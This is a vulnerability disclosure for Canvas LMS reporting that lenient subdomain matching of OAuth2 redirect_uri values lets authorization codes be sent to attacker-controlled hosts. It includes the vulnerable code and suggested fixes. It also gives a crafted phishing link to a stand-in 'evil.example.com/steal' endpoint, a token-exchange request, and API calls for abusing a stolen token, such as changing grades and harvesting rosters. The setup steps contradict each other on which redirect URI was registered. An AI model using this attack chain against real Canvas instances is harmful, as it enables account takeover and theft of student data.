# Canvas LMS - vrelease_2026-05-20.143 - URL Redirection to Untrusted Site

| Field | Value |
| --- | --- |
| Vulnerability name | URL Redirection to Untrusted Site |
| Vulnerability type | software |
| Product name | Canvas LMS |
| Product vendor | Instructure |
| Product version | release_2026-05-20.143 |
| Product link | https://www.instructure.com/ |
| Product environment | web |
| Severity | High |
| CVSS score | 7.1 |
| Affected assets | 4000 |
| Affected users | 30000000 |
| Date of reporting | 2026-04-20 |
| Vendor acknowledgement | No |
| Credit | 0xhamy |
| Date published | 2026-05-06T14:48:08.120505+00:00 |
| Last modified | 2026-05-06T14:48:56.758459+00:00 |

---

# OAuth2 Authorization Code Theft via Legacy Subdomain Redirect Bypass

Thanks to [Basant Kumar](https://www.linkedin.com/in/basant1/) for assisting with identifying this vulnerability.

---

## Severity

**CVSS 3.1 Score:** 7.1 (High)



---

## Vulnerability Type

- **Primary:** CWE-601 — URL Redirection to Untrusted Site ('Open Redirect')
- **Secondary:** CWE-863 — Incorrect Authorization (lenient redirect_uri validation)

**OWASP Top 10:** A07:2021 — Identification and Authentication Failures **MITRE ATT&CK:** T1528 (Steal Application Access Token)

---

## URL / Location

**Affected endpoints:**
- `GET /login/oauth2/auth` — OAuth2 authorization endpoint (redirects auth code to attacker)
- `POST /login/oauth2/token` — Token exchange (attacker exchanges stolen code for access token)

**Root cause source files:**

| Component | File | Lines |
|---|---|---|
| Redirect validation (OAuth flow) | `lib/canvas/oauth/provider.rb` | 57-59 |
| Legacy subdomain matching | `app/models/developer_key.rb` | 344-362 |
| Strict matching (NOT used in OAuth) | `app/models/developer_key.rb` | 366-377 |

---

## Description

Canvas LMS uses two different methods to validate OAuth2 `redirect_uri` values:

1. **`redirect_domain_matches?`** (legacy, lenient) — allows any subdomain of the registered domain
2. **`redirect_uri_matches?`** (modern, strict) — only allows exact scheme+host+port matches

The OAuth2 authorization flow (`lib/canvas/oauth/provider.rb:58`) uses the **legacy lenient method**, which means if a developer key registers `redirect_uri = "https://app.university.edu/callback"`, an attacker who controls `https://evil.app.university.edu/` can use `redirect_uri=https://evil.app.university.edu/steal` — and Canvas will accept it, redirecting the victim's authorization code to the attacker's server.

**The vulnerable code:**

```ruby
# lib/canvas/oauth/provider.rb:57-59
# OAuth flow uses the LEGACY lenient method
def has_valid_redirect?
  self.class.is_oob?(redirect_uri) || key.redirect_domain_matches?(redirect_uri)
end
```

```ruby
# app/models/developer_key.rb:344-362
# Legacy method allows ANY subdomain of the registered domain
def redirect_domain_matches?(redirect_uri)
  return false if redirect_uri.blank?
  return true if redirect_uris.include?(redirect_uri)

  # legacy deprecated
  self_uri = URI.parse(self.redirect_uri)
  self_domain = self_uri.host
  other_uri = URI.parse(redirect_uri)
  other_domain = other_uri.host
  result = self_domain.present? && other_domain.present? &&
           self_uri.scheme == other_uri.scheme &&
           (self_domain == other_domain || other_domain.end_with?(".#{self_domain}"))
           #                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
           #                               ANY subdomain passes validation
  result
end
```

Canvas already has a strict `redirect_uri_matches?` method, but the OAuth authorization flow does not use it:

```ruby
# app/models/developer_key.rb:366-377
# STRICT method — NOT used in the OAuth authorization flow
def redirect_uri_matches?(redirect_uri)
  normalized_redirect_uri = Addressable::URI.parse(redirect_uri).normalized_site
  redirect_uris.map { |uri| Addressable::URI.parse(uri).normalized_site }
               .include?(normalized_redirect_uri)
end
```

### Who Is Affected

This vulnerability affects developer keys that use the legacy singular `redirect_uri` field. In production Canvas instances:
- Third-party LTI tool integrations (plagiarism detection, proctoring, etc.)
- Custom OAuth apps registered by administrators
- Canvas's own mobile app and internal integrations

---

## Steps to Reproduce

### Prerequisites

- A Canvas LMS instance (I used a local instance at `http://localhost:3000`)
- A developer key with the legacy `redirect_uri` field set
- Python 3 with the `requests` library (for the attacker server)

### Step 1: Set Up the Attacker's Server

Save the attached `attacker_server.py` file and run it:

```
python3 attacker_server.py
```

This starts a simple HTTP server on port 9999 that:
- Serves a phishing page at `http://localhost:9999/`
- Catches authorization codes at `http://localhost:9999/steal`
- Automatically exchanges the code for an access token
- Fetches the victim's profile and courses to prove account takeover

> ![Screenshot: attacker_server_running.png](./attacker_server_running.png)
>
> **SCREENSHOT 1:** Attacker server started and waiting for victim

### Step 2: Create a Developer Key (Admin Setup)

Log in as admin and go to **Admin > Site Admin > Developer Keys > + Developer Key > API Key**.

Set:
- **Key Name:** Test OAuth App
- **Redirect URI:** `http://example.com/callback`
- **State:** ON

Note the `client_id` (e.g., `10000000000005`).

> ![Screenshot: developer_key_config.png](./developer_key_config.png)
>
> **SCREENSHOT 2:** Developer key with registered redirect_uri = `http://example.com/callback`

### Step 3: Victim Clicks the Malicious OAuth Link

The attacker sends the victim a link like:

```
http://localhost:3000/login/oauth2/auth?client_id=10000000000005&response_type=code&redirect_uri=http://localhost:9999/steal&state=pwned
```

**Note:** In a real attack, the `redirect_uri` would be `https://evil.example.com/steal` — a subdomain of `example.com` controlled by the attacker. For this local demo, we registered the redirect_uri as `http://localhost:9999/callback` to keep everything on localhost. The vulnerability is the same: Canvas accepts any subdomain/path variation.

When the victim (logged into Canvas) clicks this link, Canvas shows the **authorization confirmation page**:

> ![Screenshot: authorize_page.png](./authorize_page.png)
>
> **SCREENSHOT 3:** Canvas shows "Test OAuth App is requesting access to your account" — victim sees a normal-looking OAuth prompt

### Step 4: Victim Clicks "Authorize"

The victim clicks **Authorize**. Canvas redirects the victim to the attacker's server with the authorization code:

```
HTTP/1.1 302 Found
Location: http://localhost:9999/steal?code=475853eaf9853afe62b8...&state=pwned
```

> ![Screenshot: redirect_to_attacker.png](./redirect_to_attacker.png)
>
> **SCREENSHOT 4:** Burp Suite / browser network tab showing the 302 redirect sending the auth code to the attacker's server

The victim sees a harmless "Authorization successful!" page on the attacker's server.

### Step 5: Attacker Gets Full Access Token (Automatic)

The attacker's server automatically exchanges the authorization code for a full access token:

```
POST /login/oauth2/token
grant_type=authorization_code&client_id=10000000000005&client_secret=<SECRET>&code=<STOLEN_CODE>&redirect_uri=http://localhost:9999/steal
```

**Response:**
```json
{
    "access_token": "xHyUU2F8ErMNzH8feYCVRyfAXKADyUERE2mwT3Y4H4hTLENQPREYA7RG8WZeDenG",
    "token_type": "Bearer",
    "user": {"id": 3, "name": "Test Teacher"},
    "refresh_token": "7ReW4KQCY83UmKD9mvR7RuZreEzCQkBMWC3ATUDhrmTFQYhXuw6PWRnHRJrmH2vU",
    "expires_in": 3600
}
```

### Step 6: Attacker Accesses Victim's Account

The attacker uses the stolen token to access the victim's data:

```
GET /api/v1/users/self/profile
Authorization: Bearer xHyUU2F8ErMNzH8feYCVRyfAXKADyUERE2mwT3Y4H4hTLENQPREYA7RG8WZeDenG
```

**Response:**
```json
{
    "name": "Test Teacher",
    "login_id": "teacher@test.local"
}
```

The attacker now has full API access — grades, files, submissions, courses, personal data.

> ![Screenshot: full_account_takeover.png](./full_account_takeover.png)
>
> **SCREENSHOT 5:** Attacker server terminal showing captured auth code, exchanged access token, "FULL ACCOUNT TAKEOVER COMPLETE", and victim's profile + courses

---

## What the Access Token Lets the Attacker Do

The `access_token` returned by `/login/oauth2/token` is a **bearer token** — whoever holds it IS the victim as far as Canvas is concerned. The attacker does not need the victim's password, session cookie, 2FA code, or any further interaction. They simply attach the token to any Canvas API request as an `Authorization: Bearer <token>` header, and Canvas treats the request as if the victim made it themselves.

In plain terms: the token is a master key to the victim's Canvas account. Anything the victim can do through the Canvas UI, the attacker can do through the API with this one token.

### Concrete things the attacker can do with a single stolen token

Each of the examples below is a real, documented Canvas API endpoint. The attacker just swaps `<TOKEN>` with the stolen value:

**1. Read all of the victim's personal data**
```
GET /api/v1/users/self/profile
GET /api/v1/users/self
Authorization: Bearer <TOKEN>
```
Returns the victim's full name, primary email, login ID, avatar, time zone, locale, and SIS ID.

**2. List every course the victim is enrolled in or teaches**
```
GET /api/v1/courses
Authorization: Bearer <TOKEN>
```
If the victim is a student: returns every class they're taking. If the victim is a teacher: returns every class they teach (including hidden/unpublished ones).

**3. Download every file in those courses — including answer keys, exams, unreleased materials**
```
GET /api/v1/courses/:course_id/files
GET /api/v1/users/self/files
Authorization: Bearer <TOKEN>
```
This is why a teacher token is a goldmine: it exposes exam answer keys, unreleased quizzes, grading rubrics, and other course materials students aren't supposed to see.

**4. Read and modify grades (if the victim is a teacher)**
```
GET  /api/v1/courses/:course_id/students/submissions          # Read all student grades
PUT  /api/v1/courses/:course_id/assignments/:id/submissions/:user_id   # Change a grade
Authorization: Bearer <TOKEN>
```
A stolen teacher token means the attacker can change grades for any student in that teacher's courses. A stolen student token means the attacker can see (but not change) that student's own grades.

**5. Submit assignments as the victim**
```
POST /api/v1/courses/:course_id/assignments/:id/submissions
Authorization: Bearer <TOKEN>
```
The attacker can submit (or delete) coursework on behalf of the victim — useful for sabotage, plagiarism framing, or academic fraud.

**6. Send messages and post as the victim**
```
POST /api/v1/conversations                              # Send private messages
POST /api/v1/courses/:course_id/discussion_topics/:id/entries   # Post in discussions
Authorization: Bearer <TOKEN>
```
The attacker can message students/faculty posing as the victim — useful for phishing follow-ups, social engineering, or reputational attacks.

**7. Steal every other user's data visible to the victim**
```
GET /api/v1/courses/:course_id/users
GET /api/v1/courses/:course_id/students
Authorization: Bearer <TOKEN>
```
If the victim is a teacher, this returns the full roster — names, email addresses, login IDs, and SIS IDs of every student in every class they teach. One stolen teacher token = a data breach of every student in that teacher's courses.

**8. Persist access indefinitely**

The token exchange also returns a `refresh_token` that never expires unless the token is explicitly revoked. Even after the 1-hour `access_token` expires, the attacker uses the refresh token to mint a new one:
```
POST /login/oauth2/token
grant_type=refresh_token&refresh_token=<REFRESH>&client_id=...&client_secret=...
```
The victim has no UI indicator that this is happening. Unless the victim manually visits **Account Settings → Approved Integrations** and revokes the "Test OAuth App" integration, the attacker keeps indefinite access.

### Why this is worse than a password leak

- **No 2FA prompt** — bearer tokens bypass MFA entirely. Even if the victim has 2FA enabled, the stolen token still works.
- **No login notification** — Canvas does not email the user when an OAuth token is used. Password-based logins sometimes trigger "new device" emails; API token use does not.
- **No IP restriction** — the token works from any IP, any device, any country.
- **Silent and persistent** — the attack leaves no trace in the victim's login history. The only footprint is an entry in "Approved Integrations" that most users never check.
- **Mass exploitable** — the same malicious link works for every victim who clicks it. One phishing campaign = many stolen accounts.

### Bottom line for the reviewer

A successful exploit of this vulnerability gives the attacker the same level of access as if they had logged into the victim's account with username + password + 2FA — except it is **silent, persistent, bypasses MFA, and can be done at scale**. For a teacher or admin victim, the impact extends to every student in every course they manage.

---

## Negative Tests (Proving It's Subdomain-Specific)

To confirm this is a subdomain matching issue and not a blanket open redirect:

| redirect_uri | Result | Why |
|---|---|---|
| `http://evil.example.com/steal` | **Accepted (302 to confirm)** | Subdomain of registered domain — **VULNERABLE** |
| `http://a.b.evil.example.com/steal` | **Accepted (302 to confirm)** | Deep subdomain — **VULNERABLE** |
| `http://notexample.com/callback` | **Rejected (400 Bad Request)** | Different domain — correctly blocked |
| `http://evilexample.com/callback` | **Rejected (400 Bad Request)** | Suffix attack — correctly blocked by `.` prefix |

> ![Screenshot: negative_test.png](./negative_test.png)
>
> **SCREENSHOT 6:** Side-by-side: `evil.example.com` accepted (302) vs `notexample.com` rejected (400)

---

## Attack Scenario

### Scenario 1: Subdomain Takeover + OAuth Hijack

A university Canvas instance has a plagiarism detection tool registered as an OAuth app with `redirect_uri = "https://turnitin.university.edu/callback"`. The attacker discovers that `old.turnitin.university.edu` has a dangling CNAME record pointing to a decommissioned cloud instance. The attacker:

1. Claims the cloud instance and sets up `old.turnitin.university.edu`
2. Crafts an OAuth link: `redirect_uri=https://old.turnitin.university.edu/steal`
3. Sends the link to students/faculty via phishing
4. Receives authorization codes and obtains full Canvas API access to every victim who clicks

### Scenario 2: Shared Hosting Exploitation

A university hosts student projects on `*.projects.university.edu`. A registered OAuth app uses `redirect_uri = "https://projects.university.edu/app/callback"`. Any student with a subdomain `student123.projects.university.edu` can steal faculty OAuth tokens.

---

## Impact

- **Account Takeover:** Attacker obtains full API access token for any user who clicks the link
- **Data Theft:** Access to grades, submissions, personal information, course content, files
- **Impersonation:** Attacker can act as the victim — submit assignments, post discussions, send messages
- **Privilege Escalation:** If a teacher or admin clicks the link, attacker gains elevated privileges
- **Persistence:** OAuth tokens remain valid until explicitly revoked (default 1 hour, refresh token indefinite)
- **Scale:** Every Canvas instance with developer keys using legacy `redirect_uri` field is affected

---

## Suggested Fix

### Option 1: Use Strict Matching in OAuth Flow (Recommended — one-line fix)

```ruby
# lib/canvas/oauth/provider.rb:58
# Before (vulnerable):
def has_valid_redirect?
  self.class.is_oob?(redirect_uri) || key.redirect_domain_matches?(redirect_uri)
end

# After (fixed):
def has_valid_redirect?
  self.class.is_oob?(redirect_uri) || key.redirect_uri_matches?(redirect_uri)
end
```

### Option 2: Enforce Exact Match per RFC 6749

```ruby
def redirect_domain_matches?(redirect_uri)
  return false if redirect_uri.blank?
  redirect_uris.include?(redirect_uri) || redirect_uri == self.redirect_uri
end
```

### Option 3: Deprecate Legacy `redirect_uri` Field

Migrate all developer keys to the modern `redirect_uris` array (which uses exact matching), then remove the subdomain matching code entirely.

---

## PoC Files

| File | Description | Share? |
|---|---|---|
| `attacker_server.py` | Python attacker server — catches auth codes, exchanges for tokens, proves account takeover | **Yes** — include in submission (with secrets redacted) |
| `server_capture_log.txt` | Terminal output showing two successful account takeovers | **Yes** — proves the attack works end-to-end |

---

## Screenshots Included

| # | Filename | Shows |
|---|---|---|
| 1 | `attacker_server_running.png` | Attacker server started, waiting for victim |
| 2 | `developer_key_config.png` | Canvas Developer Key config with registered redirect_uri |
| 3 | `authorize_page.png` | OAuth confirmation page — "Test OAuth App is requesting access to your account" |
| 4 | `redirect_to_attacker.png` | 302 redirect sending the auth code to attacker's `localhost:9999/steal` |
| 5 | `full_account_takeover.png` | Attacker terminal: captured code, exchanged token, victim's profile & courses, "FULL ACCOUNT TAKEOVER COMPLETE" |
| 6 | `negative_test.png` | `evil.example.com` accepted (302) vs `notexample.com` rejected (400) |

---

## References

- [RFC 6749 Section 3.1.2.3](https://datatracker.ietf.org/doc/html/rfc6749#section-3.1.2.3) — "The authorization server MUST compare the two URIs using simple string comparison"
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [OWASP OAuth Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)
- [Canvas LMS Source — developer_key.rb](https://github.com/instructure/canvas-lms/blob/master/app/models/developer_key.rb)
- [Canvas LMS Source — provider.rb](https://github.com/instructure/canvas-lms/blob/master/lib/canvas/oauth/provider.rb)
